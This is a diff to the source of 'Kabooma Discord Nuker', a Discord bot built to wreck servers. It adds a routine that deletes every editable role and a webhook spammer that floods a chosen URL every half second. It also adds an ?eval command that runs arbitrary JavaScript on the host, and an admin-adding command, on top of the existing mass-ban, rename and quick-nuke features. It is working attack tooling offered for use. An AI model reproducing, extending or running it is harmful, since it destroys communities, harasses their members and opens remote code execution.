@@ -2,7 +2,7 @@
 //    ===================================
 //    -- Kabooma Discord Nuker ----------
 //    --- By: @RatWithAFace -------------
-//    ---- Edited: 12/23/2023 -----------
+//    ---- Edited: 12/27/2023 -----------
 //    ===================================
 
 const { Client, Events, GatewayIntentBits, Partials, EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder } = require('discord.js')
@@ -37,7 +37,7 @@ async function setup() {
    botc = JSON.parse(fs.readFileSync('./configuration/bot.json'))
    Promise.all([
       fs.writeFileSync('./configuration/bot.json', JSON.stringify({bots: [answers]})),
-      fs.writeFileSync('./configuration/client.json', JSON.stringify({ name, setup: true, admin: false }))
+      fs.writeFileSync('./configuration/client.json', JSON.stringify({ name, setup: true, admins: [false] }))
    ]).then(() => {
       botc = JSON.parse(fs.readFileSync('./configuration/bot.json'))
       console.log(chalk.blueBright('[INFO] Main script running in 3 seconds.'))
@@ -72,10 +72,10 @@ function main(setup) {
 
    mainClient.on(Events.MessageCreate, async message => {
       if (message.channel.type == 1) {
-         if (config.client.admin === false) {
+         if (config.client.admins[0] === false) {
             vCode = Math.random().toString(36).slice(2) + Math.random().toString(36).toUpperCase().slice(2)
             currentConfig = JSON.parse(fs.readFileSync('./configuration/client.json'))
-            currentConfig.admin = 0
+            currentConfig.admins[0] = 0
             Promise.all([
                fs.writeFileSync(`./configuration/temp/${message.author.id}-verification.txt`, `${vCode}`),
                fs.writeFileSync('./configuration/client.json', JSON.stringify(currentConfig))
@@ -83,16 +83,16 @@ function main(setup) {
                reloadConfig()
                clipboard.copy(vCode, () => console.log(chalk.blueBright(`@${message.author.username} has sent a DM to the main client!\nSince there are no current admins, please send the bot this message to verify your identity:\n${vCode}\nIt has been copied to your clipboard.`)))
             })
-         } else if (config.client.admin == 0) {
+         } else if (config.client.admins[0] == 0) {
             if (message.content == fs.readFileSync(`./configuration/temp/${message.author.id}-verification.txt`)) {
                console.log('Verified!')
                currentConfig = JSON.parse(fs.readFileSync('./configuration/client.json'))
-               currentConfig.admin = message.author.id
+               currentConfig.admins[0] = message.author.id
                fs.writeFileSync('./configuration/client.json', JSON.stringify(currentConfig))
                fs.unlinkSync(`./configuration/temp/${message.author.id}-verification.txt`)
                reloadConfig()
             }
-         } else if (config.client.admin == message.author.id) {
+         } else if (config.client.admins.includes(message.author.id)) {
             const prefix = '?'
             if (!message.content.startsWith(prefix)) return
             const command= message.content.slice(prefix.length)
@@ -121,7 +121,12 @@ function main(setup) {
                      nameChange: "", 
                      iconChange: "",
                      bannerChange: "" 
+                  },
+
+                  roles: {
+                     enabled: true
                   }
+
                }
                const enableChannel = new ButtonBuilder()
                .setCustomId('enablechannel')
@@ -226,9 +231,17 @@ function main(setup) {
                      case 'banningmodal':
                         newConfig.banning.enabled = true
                         newConfig.banning.banReason = interaction.fields.getTextInputValue('banningreason')
-                        newSequence(interaction, 'server', 'Enable changing server information?')
+                        newSequence(interaction, 'roles', 'Enable role deletion?')
                         break
                      case 'disablebanning':
+                        newConfig.banning.enabled = false
+                        newSequence(interaction, 'roles', 'Enable role deletion?')
+                        break
+                     case 'enableroles':
+                        newConfig.banning.enabled = true
+                        newSequence(interaction, 'server', 'Enable changing server information?')
+                        break
+                     case 'disableroles':
                         newConfig.banning.enabled = false
                         newSequence(interaction, 'server', 'Enable changing server information?')
                         break
@@ -357,7 +370,7 @@ function main(setup) {
                      guild.setName(usedConfig.server.nameChange)
                      guild.setIcon(usedConfig.server.iconChange)
                      if (guild.banner != null) {
-                         guild.setBanner(usedConfig.server.bannerChange)
+                        guild.setBanner(usedConfig.server.bannerChange)
                      }
                   }
 
@@ -433,10 +446,19 @@ function main(setup) {
                           }
                       }
                   }
+
+                  if (usedConfig.roles.enabled) {
+                     var gRoles = guild.roles.cache.map(role => role.id)
+                     for (let i = 0; i < gRoles.length; i++) {
+                        var role = guild.roles.cache.get(gRoles[i])
+                        if (role.editable) {
+                           role.delete()
+                        }
+                     }
+                  }
                }
 
                mainClient.on(Events.InteractionCreate, async interaction => {
-                  if (!interaction.isAnySelectMenu) return
                   switch (interaction.customId) {
                      case 'guild':
                         guild = mainClient.guilds.cache.get(interaction.values[0])
@@ -466,6 +488,7 @@ function main(setup) {
                         break
                      case 'config':
                         nuker(interaction)
+                        break
                   }
                })
             }
@@ -476,19 +499,34 @@ function main(setup) {
                .setDescription("Every command you could possibly\nneed in kabooma.")
                .addFields(
                  {
-                   name: "?quicknuke",
-                   value: "Initiates a nuke on a server w/o setting\nprevious configuration.",
-                   inline: false
+                     name: "?quicknuke",
+                     value: "Initiates a nuke on a server w/o setting\nprevious configuration.",
+                     inline: false
                  },
                  {
-                   name: "?configcreate",
-                   value: "Creates a new nuke configuration.",
-                   inline: false
+                     name: "?configcreate",
+                     value: "Creates a new nuke configuration.",
+                     inline: false
                  },
                  {
-                   name: "?nuke",
-                   value: "Nukes a server with a set configuration.",
-                   inline: false
+                     name: "?nuke",
+                     value: "Nukes a server with a set configuration.",
+                     inline: false
+                 },
+                 {
+                     name: "?spamwebhook",
+                     value: "Spams a webhook url with requests.",
+                     inline: false
+                 },
+                 {
+                     name: "?eval",
+                     value: "Runs a JavaScript script on the local computer.",
+                     inline: false
+                 },
+                 {
+                     name: "?addadmin",
+                     value: "Adds an admin to the bot. Allows user to message and use the bot.",
+                     inline: false
                  },
                )
                .setColor("#ff0095")
@@ -510,6 +548,142 @@ function main(setup) {
             if (command === 'quicknuke') {
                var tempConfig = Math.floor(Math.random() * 9999) + 1000
                configCreate(message, tempConfig.toString())
+            }
+
+            if (command === 'spamwebhook') {
+               const spamWebhookButton = new ButtonBuilder()
+               .setCustomId('spamwebhookbutton')
+               .setLabel('Configure')
+               .setStyle(ButtonStyle.Success)
+               const row = new ActionRowBuilder()
+               .addComponents(spamWebhookButton)
+               await message.reply({components: [row]})
+
+               const listener = async interaction => {
+                  if (!interaction.isButton || !interaction.isModalSubmit) return
+                  switch (interaction.customId) {
+                     case 'spamwebhookmodal':
+                        var webhookURL = interaction.fields.getTextInputValue('webhookurl')
+                        var webhookMessage = interaction.fields.getTextInputValue('webhookmessage')
+                        var webhookName = interaction.fields.getTextInputValue('webhookname')
+                        const interval = setInterval(() => {
+                           fetch(webhookURL, { method: "POST", body: JSON.stringify({
+                              content: webhookMessage,
+                              username: webhookName
+                           }), headers: {"Content-Type": "application/json"}})
+                        }, 510)
+                        setTimeout(() => {
+                           clearInterval(interval)
+                        }, 180000);
+                        await interaction.reply('Spamming webhook!')
+                        mainClient.off(Events.InteractionCreate, listener)
+                        break 
+                     case 'spamwebhookbutton':
+                        var spamWebhookModal = new ModalBuilder()
+                        .setCustomId('spamwebhookmodal')
+                        .setTitle('Spam Webhook')
+                        var webhookURL = new TextInputBuilder()
+                        .setCustomId('webhookurl')
+                        .setLabel('Webhook URL')
+                        .setStyle(TextInputStyle.Short)
+                        var webhookMessage = new TextInputBuilder()
+                        .setCustomId('webhookmessage')
+                        .setLabel('Webhook Message')
+                        .setStyle(TextInputStyle.Paragraph)
+                        var webhookName = new TextInputBuilder()
+                        .setCustomId('webhookname')
+                        .setLabel('Webhook Username')
+                        .setStyle(TextInputStyle.Short)
+                        const spamWebhookRow1 = new ActionRowBuilder().addComponents(webhookURL)
+                        const spamWebhookRow2 = new ActionRowBuilder().addComponents(webhookMessage)
+                        const spamWebhookRow3 = new ActionRowBuilder().addComponents(webhookName)
+                        spamWebhookModal.addComponents(spamWebhookRow1, spamWebhookRow2, spamWebhookRow3)
+                        interaction.showModal(spamWebhookModal)
+                        break
+                  }
+               }
+
+               mainClient.on(Events.InteractionCreate, listener)
+            }
+
+            if (command === 'eval') {
+               const evalButton = new ButtonBuilder()
+               .setCustomId('evalbutton')
+               .setLabel('Configure')
+               .setStyle(ButtonStyle.Primary)
+               const row = new ActionRowBuilder()
+               .addComponents(evalButton)
+               await message.reply({components: [row]})
+
+               const listener = async interaction => {
+                  if (!interaction.isButton || !interaction.isModalSubmit) return
+                  switch (interaction.customId) {
+                     case 'evalmodal':
+                        await interaction.deferReply()
+                        try {
+                           var evaluation = await eval(interaction.fields.getTextInputValue('script'))
+                           console.log(evaluation)
+                           await interaction.editReply(String(evaluation))
+                           mainClient.off(Events.InteractionCreate, listener)
+                        } catch (err) {
+                           await interaction.editReply(`**ERROR!**\n${err}`)
+                           mainClient.off(Events.InteractionCreate, listener)
+                        }
+                        break
+                     case 'evalbutton':
+                        var evalModal = new ModalBuilder()
+                        .setCustomId('evalmodal')
+                        .setTitle('Evaluate Script')
+                        var script = new TextInputBuilder()
+                        .setCustomId('script')
+                        .setLabel('Script')
+                        .setStyle(TextInputStyle.Paragraph)
+                        const evalRow1 = new ActionRowBuilder().addComponents(script)
+                        evalModal.addComponents(evalRow1)
+                        interaction.showModal(evalModal)
+                        break
+                  }
+               }
+
+               mainClient.on(Events.InteractionCreate, listener)
+            }
+
+            if (command === 'addadmin') {
+               const addAdminButton = new ButtonBuilder()
+               .setCustomId('addadminbutton')
+               .setLabel('Configure')
+               .setStyle(ButtonStyle.Primary)
+               const row = new ActionRowBuilder()
+               .addComponents(addAdminButton)
+               await message.reply({components: [row]})
+
+               const listener = async interaction => {
+                  if (!interaction.isButton || !interaction.isModalSubmit) return
+                  switch (interaction.customId) {
+                     case 'adminmodal':
+                        currentConfig = JSON.parse(fs.readFileSync('./configuration/client.json'))
+                        currentConfig.admins.push(interaction.fields.getTextInputValue('userid'))
+                        fs.writeFile('./configuration/client.json', JSON.stringify(currentConfig), async () => {
+                           reloadConfig()
+                           await interaction.reply(`Added ${interaction.fields.getTextInputValue('userid')} as an admin!`)
+                           mainClient.off(Events.InteractionCreate, listener)
+                        })
+                        break
+                     case 'addadminbutton':
+                        var adminModal = new ModalBuilder()
+                        .setCustomId('adminmodal')
+                        .setTitle('Add Administrator')
+                        var userID = new TextInputBuilder()
+                        .setCustomId('userid')
+                        .setLabel('User ID')
+                        .setStyle(TextInputStyle.Short)
+                        const adminRow1 = new ActionRowBuilder().addComponents(userID)
+                        adminModal.addComponents(adminRow1)
+                        interaction.showModal(adminModal)
+                        break
+                  }
+               }
+               mainClient.on(Events.InteractionCreate, listener)
             }
 
          } else return
